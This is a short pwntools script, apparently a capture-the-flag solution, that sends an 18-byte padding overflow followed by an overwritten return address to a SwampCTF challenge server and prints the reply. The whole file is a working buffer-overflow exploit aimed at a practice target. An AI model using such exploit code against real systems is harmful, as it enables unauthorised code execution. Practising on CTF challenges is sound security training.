import pwn

r = pwn.remote('chals.swampctf.com', 40001)
# r = pwn.process('./binary')

offset = 18

r.sendline((b"A" * offset)  + b"\x86\x11\x40\x00\x00\x00\x00\x00")
res = r.recvall()

print(res)